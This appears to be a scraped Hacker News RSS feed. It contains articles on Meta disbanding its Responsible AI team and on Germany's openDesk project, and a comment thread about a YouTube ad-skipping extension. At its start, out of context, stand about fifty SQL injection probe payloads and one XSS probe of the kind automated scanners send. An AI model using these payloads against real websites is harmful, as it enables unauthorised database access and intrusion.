1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IRxO
-4257) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x5a56494c70464b587453,0x716b767071),NULL,NULL#
1 AND (SELECT 8736 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(8736=8736,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- oBAE
ZMskyuza
1') ORDER BY 1-- Cgxv
(SELECT (CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (1627=1627) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)))
1') ORDER BY 1088#
1' AND 3934=5158 AND 'vqcg'='vqcg
1%' UNION ALL SELECT NULL,NULL#
1 AND 4713=(SELECT 4713 FROM PG_SLEEP(5))-- aDYj
-2385) UNION ALL SELECT CONCAT(0x71626a7a71,0x4e4153736d6d446b4978,0x716b767071),NULL,NULL,NULL,NULL,NULL,NULL#
1');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(77)||CHR(78)||CHR(116),5) FROM DUAL--
1 UNION ALL SELECT NULL,NULL-- hWHI
1' ORDER BY 5527-- RtgZ
1' UNION ALL SELECT NULL#
1') ORDER BY 1#
1;SELECT SLEEP(5)#
-2218) UNION ALL SELECT 84,84,84,CONCAT(0x71626a7a71,0x4f696563506772457174,0x716b767071),84,84,84#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- lZCq
1' AND 3475=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3475=3475) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND 'VmGf'='VmGf
1 UNION ALL SELECT NULL,NULL,NULL,NULL-- Ttym
wrBEIRqX'"()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;nrJK(9039)&lt;/ScRiPt&gt;
1) UNION ALL SELECT NULL,NULL,NULL#
-8100) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x7572524866586e4a65434d6c51424355464d76616a59696e4d526146506f74647777585668715050,0x716b767071)#
roomName' AND 2*3*8=6*8 AND 'flkw'='flkw
(SELECT (CASE WHEN (2646=4989) THEN 2646 ELSE 2646*(SELECT 2646 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
1' UNION ALL SELECT NULL,NULL#
1' AND SLEEP(5) AND 'IEBY'='IEBY
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- vzHW
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KRVX
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rzDE
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cQUz
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- BycO
mvOISYtD
1 UNION ALL SELECT NULL,NULL-- CseT
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- puZd
-4511) UNION ALL SELECT CONCAT(0x71626a7a71,0x684c5347625a43665a72,0x716b767071),84,84,84,84,84,84#
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- yCEz
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
-3865) UNION ALL SELECT NULL,NULL,CONCAT(0x71626a7a71,0x53726e586e566c4c5561534470485865554847537242536a484d61416163797669414569666b7251,0x716b767071),NULL,NULL,NULL,NULL#
1%';SELECT SLEEP(5)#
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
1%' AND 4713=(SELECT 4713 FROM PG_SLEEP(5)) AND '%'='
1) AND 4713=(SELECT 4713 FROM PG_SLEEP(5)) AND (4583=4583
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
</code></pre></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Meta disbanded its Responsible AI team (369 pts)]]></title>
            <link>https://www.theverge.com/2023/11/18/23966980/meta-disbanded-responsible-ai-team-artificial-intelligence</link>
            <guid>38328355</guid>
            <pubDate>Sun, 19 Nov 2023 03:18:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/2023/11/18/23966980/meta-disbanded-responsible-ai-team-artificial-intelligence">https://www.theverge.com/2023/11/18/23966980/meta-disbanded-responsible-ai-team-artificial-intelligence</a>, See on <a href="https://news.ycombinator.com/item?id=38328355">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Meta has reportedly broken up its Responsible AI (RAI) team as it puts more of its resources into generative artificial intelligence. <a href="https://www.theinformation.com/articles/meta-breaks-up-its-responsible-ai-team"><em>The Information</em> broke the news</a> today, citing an internal post it had seen. </p><p>According to the report, most RAI members will move to the company’s generative AI product team, while others will work on Meta’s AI infrastructure. The company regularly says it wants to develop AI responsibly and even <a href="https://ai.meta.com/responsible-ai/">has a page</a> devoted to the promise, where the company lists its “pillars of responsible AI,” including accountability, transparency, safety, privacy, and more. </p><p><em>The Information</em>’s report quotes Jon Carvill, who represents Meta, as saying that the company will “continue to prioritize and invest in safe and responsible AI development.” He added that although the company is splitting the team up, those members will “continue to support relevant cross-Meta efforts on responsible AI development and use.” </p><p>Meta did not respond to a request for comment by press time.</p><p>The team already saw a restructuring earlier this year, which <a href="https://www.businessinsider.com/meta-layoffs-responsible-ai-team-2023-10"><em>Business Insider </em>wrote</a> included layoffs that left RAI “a shell of a team.” That report went on to say the RAI team, which had existed since 2019, had little autonomy and that its initiatives had to go through lengthy stakeholder negotiations before they could be implemented.</p><p>RAI was created to identify problems with its AI training approaches, including whether the company’s models are trained with adequately diverse information, with an eye toward preventing things like moderation issues on its platforms. Automated systems on Meta’s social platforms have led to problems like a Facebook translation issue that <a href="https://www.theverge.com/us-world/2017/10/24/16533496/facebook-apology-wrong-translation-palestinian-arrested-post-good-morning">caused a false arrest</a>, WhatsApp AI sticker generation that results in biased images <a href="https://www.theverge.com/2023/11/5/23946732/whatsapp-ai-sticker-guns-palestine-israel">when given certain prompts</a>, and Instagram’s algorithms <a href="https://www.theverge.com/2023/6/7/23752192/instagrams-recommendation-algorithms-promote-pedophile-networks-investigation">helping people find child sexual abuse materials</a>.</p><div><p>Moves like Meta’s and a <a href="https://www.theverge.com/2023/3/13/23638823/microsoft-ethics-society-team-responsible-ai-layoffs">similar one by Microsoft</a> early this year come as world governments race to create regulatory guardrails for artificial intelligence development. The US government entered into <a href="https://www.theverge.com/2023/9/12/23870092/nvidia-ibm-adobe-white-house-ai-agreement-nonbinding">agreements with AI companies</a> and President Biden later directed government agencies to <a href="https://www.theverge.com/2023/10/30/23914507/biden-ai-executive-order-regulation-standards">come up with AI safety rules</a>. Meanwhile, the European Union has <a href="https://www.theverge.com/2023/9/18/23878784/uk-anti-trust-regulator-ai-principles">published its AI principles</a> and is still <a href="https://www.theverge.com/2023/10/23/23929273/eu-ai-act-generative-regulation-models">struggling to pass its AI Act</a>.</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Governments turn to Open Source for sovereignty (150 pts)]]></title>
            <link>https://opensource.net/governments-adopt-open-source-sovereignty/</link>
            <guid>38327882</guid>
            <pubDate>Sun, 19 Nov 2023 02:29:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://opensource.net/governments-adopt-open-source-sovereignty/">https://opensource.net/governments-adopt-open-source-sovereignty/</a>, See on <a href="https://news.ycombinator.com/item?id=38327882">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>The German government has launched a new Open Source software project called openDesk, which aims to reduce the country’s dependency on proprietary software vendors and support transparency and interoperability.</p>



<p>openDesk is a collection of Open Source software modules that are important for day-to-day work in the public sector, such as text creation, file collaboration, project management, email, calendar and messaging.</p>



<p>While the initial focus is on public administration in Germany, The source code is publicly available on a government-provided GitLab called <a href="https://opencode.de/en">openCoDE</a>, making it available, free of charge, for use by other organizations, industries and geographical location. Discussions are taking place with other European countries; France and Austria in particular have already expressed interest.</p>



<p>Commissioned by the German Federal Ministry of the Interior and Home Affairs (BMI), under the project leadership of a newly created Center for Digital Sovereignty, <a href="https://zendis.de/">ZenDiS</a>.</p>



<h2>How it works</h2>



<p>Here’s how the project might play out on a day-to-day level: </p>



<p>A government employee based in Cologne logs into openDesk where she finds a suite of productivity tools in one integrated solution. To create a document about a new city ordinance, she uses Collabora Online to write and edit the document. This is part of a larger project managed in OpenProject with all its milestones and deliverables. The document is then uploaded and shared with other employees in Nextcloud to get their feedback and directly linked to the respective milestone of the project.</p>



<p>Once the document is final, she uses Open-Xchange to inform other parties via email; important project milestones are also shared in the calendar. For ad-hoc coordination with colleagues, she uses the Element chat or starts a video conference via Jitsi.</p>



<h2>What’s inside openDesk</h2>



<p>openDesk builds on the idea of Dataport’s Phoenix project (dPhonix suite) but only uses Open Source components.</p>



<p>The project has already attracted a number of Open Source software providers, including Collabora Online, Element, Nextcloud, Nordeck IT + Consulting, OpenProject, Open-Xchange and XWiki.</p>



<figure datatext=""><img fetchpriority="high" decoding="async" width="1024" height="283" src="https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/blog-sovereign-workplace-opendesk.jpg?resize=1024%2C283&amp;ssl=1" alt="" srcset="https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/blog-sovereign-workplace-opendesk-scaled.jpg?resize=1024%2C283&amp;ssl=1 1024w, https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/blog-sovereign-workplace-opendesk-scaled.jpg?resize=300%2C83&amp;ssl=1 300w, https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/blog-sovereign-workplace-opendesk-scaled.jpg?resize=768%2C212&amp;ssl=1 768w, https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/blog-sovereign-workplace-opendesk-scaled.jpg?resize=1536%2C425&amp;ssl=1 1536w, https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/blog-sovereign-workplace-opendesk-scaled.jpg?resize=2048%2C566&amp;ssl=1 2048w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure>



<p>These software providers are contributing a variety of modules to openDesk, including:</p>



<ul>
<li><a href="https://www.collaboraoffice.com/">Collabora Online</a>: A secure Open Source online office suite</li>



<li><a href="https://element.io/">Element</a>: An Open Source and end-to-end encrypted messenger</li>



<li><a href="https://nextcloud.com/">Nextcloud</a>: An Open Source platform to securely collaborate and share data</li>



<li><a href="https://nordeck.net/">Nordeck IT + Consulting</a>: Widgets for collaboration, including video conferencing based on Jitsi and messaging based on Matrix Element</li>



<li><a href="https://www.openproject.org/">OpenProject</a>: Waterfall, agile, and hybrid Open Source project management software</li>



<li><a href="https://www.open-xchange.com/">Open-Xchange</a>: Comprehensive email and calendar functions</li>



<li><a href="https://www.univention.com/">Univention</a>: Components for the openDesk web portal and the cross-application management of digital identities and access rights</li>



<li><a href="https://www.xwiki.org/xwiki/bin/view/Main/WebHome">XWiki</a>: An Open Source wiki platform</li>
</ul>



<p>The first version of openDesk is expected to be released in a basic version at the end of 2023.  Until then, you can follow the project and software development on the <a href="https://gitlab.opencode.de/bmi/souveraener_arbeitsplatz">Git Lab page</a>. Here’s a preview of what the openDesk start page looks like:</p>



<figure><img decoding="async" width="1024" height="516" src="https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/opendesk-preview.png?resize=1024%2C516&amp;ssl=1" alt="" srcset="https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/opendesk-preview.png?resize=1024%2C516&amp;ssl=1 1024w, https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/opendesk-preview.png?resize=300%2C151&amp;ssl=1 300w, https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/opendesk-preview.png?resize=768%2C387&amp;ssl=1 768w, https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/opendesk-preview.png?resize=1536%2C774&amp;ssl=1 1536w, https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/opendesk-preview.png?resize=2048%2C1033&amp;ssl=1 2048w, https://i0.wp.com/opensource.net/wp-content/uploads/2023/11/opendesk-preview.png?w=3000&amp;ssl=1 3000w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure>



<p><em>Image: openDesk</em></p>



<p>The openDesk project is a significant step towards digital sovereignty for the German government. By using Open Source software, the government hopes to reduce reliance on proprietary vendors and gain more control over data.</p>



<h2>Why this matters</h2>



<p>The openDesk project is a significant development in the world of Open Source software. It shows that even large governments — where the public administration is one of the <a href="https://european-union.europa.eu/principles-countries-history/country-profiles/germany_en">most important sectors</a> — are beginning to recognize the benefits of Open Source, including security, transparency and flexibility.</p>



<h2>What’s next</h2>



<p>OpenDesk is a work in progress that’s constantly being refined to meet specific needs of the public administration.  You can check out the current version of the source code on <a href="https://gitlab.opencode.de/bmi/souveraener_arbeitsplatz/info">openCoDe</a> (German only, for now) or the <a href="https://opencode.de/en">joint platform</a> of the public administration for the exchange of Open Source software.<br></p>



<p><em>Know any other examples of Open Source in government? We’d love to hear from you!</em> <a href="https://opensource.net/submit-a-post">Get in touch</a>. </p>



<p>Cover image: Photo by Pixabay from <a href="https://www.pexels.com/photo/gray-newton-s-cradle-in-close-up-photogaphy-60582">Pexels</a></p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Update on the OpenAI drama: Altman and the board had till 5pm to reach a truce (117 pts)]]></title>
            <link>https://twitter.com/alexeheath/status/1726055095341875545</link>
            <guid>38327563</guid>
            <pubDate>Sun, 19 Nov 2023 02:00:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/alexeheath/status/1726055095341875545">https://twitter.com/alexeheath/status/1726055095341875545</a>, See on <a href="https://news.ycombinator.com/item?id=38327563">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="ScriptLoadFailure"><form action="" method="GET"><div><p><span>Something went wrong, but don’t fret — let’s give it another shot.</span></p><br></div></form></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Show HN: YouTube banned adblockers so I built an extension to skip their ads (551 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=38327017</link>
            <guid>38327017</guid>
            <pubDate>Sun, 19 Nov 2023 00:54:46 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=38327017">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <tbody><tr id="38327385"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38327385" href="https://news.ycombinator.com/vote?id=38327385&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>Cool! I recently wrote my own user script to do the same thing. It's going to be very hard to patch or detect this, as updating video element props don't trigger DOM updates. They would have to either do lots of JS prototype trickery or check for playback rate when doing adblock detection. One thing to keep in mind here though since you're doing DOM lookups every time anything on the page changes, is that there could be some small overhead in page render time, and also that using fixed CSS classes means any small change to page code could break the checks. In case it's a problem in the future, checking .innerText is a hacky way to workaround it.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="38328172"><td></td></tr>
            <tr id="38327414"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327414" href="https://news.ycombinator.com/vote?id=38327414&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>They could refuse to deliver the main video content until the minimum ad time has passed?</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="38327738"><td></td></tr>
            <tr id="38327749"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_38327749" href="https://news.ycombinator.com/vote?id=38327749&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>Arms race towards people running their own private YouTube instances which pre-fetch subscriptions and recommendations to skip ads. If the video hasn't been downloaded already it pretends to play the ad in the background while waiting. A minor inconvenience, but hardly the end of the world.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="38328056"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_38328056" href="https://news.ycombinator.com/vote?id=38328056&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>Be even easier if they provided an MRSS feed! I wonder if a popular channel on YT started making their content available in an easy to parse format like MRSS if they'd notice a significant loss in YT viewers in favor of it. Of course, they'd then lose the ad share, so probably not a thing that will happen.<p>How fast would YT issue a C&amp;D if someone created an app that did this for you so that you just entered in the channels you follow, and then it would just check every so often for new content?
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                  <tr id="38327998"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_38327998" href="https://news.ycombinator.com/vote?id=38327998&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>Making this work would likely mean that the CDN edge servers become much more stateful and the costs of operating that might outweigh the additional revenue.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="38328030"><td></td></tr>
                  <tr id="38327481"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_38327481" href="https://news.ycombinator.com/vote?id=38327481&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>This has already happend to me, probably unintentionally. Something in Cromite "broke" the ads and just showed a black screen before the video started.<p>It was fine. I had no problem with it.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="38327711"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_38327711" href="https://news.ycombinator.com/vote?id=38327711&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>I had something similar happen. I'm fine with a blank screen and waiting 5-30sec.
I don't want intrusive ads before during and after a 5 min video on water heater maintenance.</span></p></div></td></tr>
        </tbody></table></td></tr>
                        <tr id="38327534"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327534" href="https://news.ycombinator.com/vote?id=38327534&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>One can simply "videoElement.addEventListener('ratechange', callback);" to be notified the ad was sped up.<p>I mean the client can then undo this, as it can any JS the page offers, but there's nothing harder about detecting playbackRate changes vs something which causes a DOM update.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                  <tr id="38327313"><td></td></tr>
                <tr id="38328190"><td></td></tr>
                  <tr id="38327710"><td></td></tr>
                      <tr id="38327314"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38327314" href="https://news.ycombinator.com/vote?id=38327314&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>That's definitely a technique to keep in reserve if they get better at detection, but uBlock Origin currently works very well on Youtube as long as its filters are up to date.</span></p></div></td></tr>
        </tbody></table></td></tr>
                      <tr id="38327332"><td></td></tr>
                <tr id="38327378"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327378" href="https://news.ycombinator.com/vote?id=38327378&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>hosts file won't work for the in-line ads present in YouTube. The ads are served from the same domain as the video you're watching.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="38327581"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_38327581" href="https://news.ycombinator.com/vote?id=38327581&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>I think it's worth noting that it wasn't always the case - there was a hosts file repo used by pihole users that effectively blocked YouTube ads.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="38328078"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_38328078" href="https://news.ycombinator.com/vote?id=38328078&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>You keep doing things based on historic knowledge and suffer those ads, while the rest of us will move along with the times and not suffer those ads. Lest we forget? sure, but it's not like they'll be going back to that technique as it's ineffective for them.</span></p></div></td></tr>
        </tbody></table></td></tr>
                        <tr id="38327572"><td></td></tr>
                  <tr id="38327446"><td></td></tr>
            <tr id="38327299"><td></td></tr>
                <tr id="38327776"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327776" href="https://news.ycombinator.com/vote?id=38327776&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>They really only did it on chrome, I think?<p>At least at work, I kept getting modals saying adblockers weren't allowed, but I never got those on firefox.</p><p>It seems to have gone away though (probably an update from ublock) even on chrome
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                  <tr id="38327371"><td></td></tr>
                <tr id="38328093"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38328093" href="https://news.ycombinator.com/vote?id=38328093&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>It does. But i think youtube attempts to detect the adblock (which ublock origin continues to evade with new updates?).<p>This extension does not block, but instead just fast forward the ad (playback speed at 10x - tbh, it could'be been at 100x probably!) and mutes it. So from the youtube js perspective, the ad has played and wasn't blocked.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                  <tr id="38327505"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38327505" href="https://news.ycombinator.com/vote?id=38327505&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>uBO works for me, just requires a manual filter update once in a while. Though I like this approach in it's own way as it still costs advertisers but delivers no value to them, maybe something more like Ad Nauseum which would click the ads too.</span></p></div></td></tr>
        </tbody></table></td></tr>
                      <tr id="38327758"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38327758" href="https://news.ycombinator.com/vote?id=38327758&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>Ultimately the conversion rate of spam continuously proves one of the worst advertising methods. They are ripping off companies they lie to about the conflated stats, and irritating the 80% of users that will never buy anything for various reasons.<p>It is going to be an interesting waste of resources. =)
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="38327745"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38327745" href="https://news.ycombinator.com/vote?id=38327745&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>It seems a lot of work to do this and worth it.<p>As a surprised customer of YouTube premium having all ads gone across videos and music across all devices really might not be a bad deal for anyone on the fence for a family plan and all your devices.</p><p>In terms of working around ads.. There are some neat solutions that seem to work ok for YouTube on tv.. but so far the family plan seems ok.</p><p>Was anyone able tog eat off the premium plan and have no ads on their phones, computers, tvs and smart speakers?
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="38327647"><td></td></tr>
            <tr id="38327801"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38327801" href="https://news.ycombinator.com/vote?id=38327801&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>I just pay for the product rather than jumping through stupid hoops to avoid paying  $3/month/user.<p>Paying to remove ads is how  you get no ads.</p><p>Refusing to pay for ad-free services just tells companies that there’s no point in attempting to make a good user experience with no ads.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="38327992"><td></td></tr>
            <tr id="38328020"><td></td></tr>
                  <tr id="38327319"><td></td></tr>
                <tr id="38327463"><td></td></tr>
                  <tr id="38327302"><td></td></tr>
                <tr id="38327467"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327467" href="https://news.ycombinator.com/vote?id=38327467&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>I still have not encountered any issues with uBlock Origin on YouTube.<p>There's 3 hypotheses I have for why this is.</p><p>1. YouTube has been gradually rolling out the counter-blocking to an expanding number of randomly selected users.</p><p>2. YouTube doesn't bother blocking me because I've purchased a substantial amount of content from them.  There's little benefit in discouraging me from buying more content in the future.</p><p>3. YouTube has done some analytics to figure out that I'm the kind of person who will never return if no ad blocking is allowed and doesn't trust them to keep ads out of Premium.</p><p>I don't suppose you've purchased shows or movies through YouTube?
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="38327965"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_38327965" href="https://news.ycombinator.com/vote?id=38327965&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>uBlock Origin + Firefox here, on both desktop and Android, I haven't gotten any warnings either. My guess is that since I'm paying $100/year for 2TB storage they've decided they're making enough from me.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="38327573"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_38327573" href="https://news.ycombinator.com/vote?id=38327573&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>I think I purchased one movie through YouTube a few years ago, but it's been a while. I received a YouTube notification a few weeks ago letting me know that AdBlock was not allowed, but there was no follow-up.<p>I feel that YouTube is very deeply entrenched in a streaming architecture which makes it challenging to serve ads that are indistinguishable from primary content. All of the pushback against adblocking extensions feels like an unwinnable arms race until Manifest v3 becomes mandatory.</p><p>Contrast this with Twitch - where uBlock doesn't impact ads at all. I feel Twitch engineered their service to defeat adblock from day 1. YouTube wants to be in the same position, but doesn't seem willing or able to mirror Twitch's architecture.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="38327634"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_38327634" href="https://news.ycombinator.com/vote?id=38327634&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>I'm pretty sure the answer is #1. Gradual, per-account roll-outs of new "features" is very common on YouTube, and from the people I've talked to, the affected people seem to be fairly random.</span></p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="38327454"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327454" href="https://news.ycombinator.com/vote?id=38327454&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>&gt; CWS and YouTube are both Google property<p>So is Chrome!</p><p>I have to wonder when Google will will start using the browser itself as leverage (beyond the upcoming Manifest V3 changes).
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                  <tr id="38327547"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38327547" href="https://news.ycombinator.com/vote?id=38327547&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>For the people saying it's fine for them, YouTube was blocking access but only doing it for certain accounts and only after you watched more than a few videos. My personal account was affected but not my work one.<p>I was using Firefox + uBlock Origin and the site would periodically stop working. Clearing cache and updating the uBO lists would fix it, but only temporarily. No idea if the situation has changed.</p><p>One alternative is pay for YT premium, but they still might target you with ads[1] which is risable. I've heard FreeTube is a thing as well.</p><p>1. <a href="https://arstechnica.com/google/2023/11/google-kills-web-integrity-drm-for-the-web-still-wants-an-android-version/?comments=1&amp;post=42331265" rel="nofollow noreferrer">https://arstechnica.com/google/2023/11/google-kills-web-inte...</a>
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                      <tr id="38327732"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38327732" href="https://news.ycombinator.com/vote?id=38327732&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>&gt; Since Youtube no longer allows AdBlockers<p>You mean "since YouTube attempted to bar adblockers, but instead entered into a war with them that it cannot win, most users of adblockers continue to watch YouTube without issues".
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                      <tr id="38327610"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38327610" href="https://news.ycombinator.com/vote?id=38327610&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
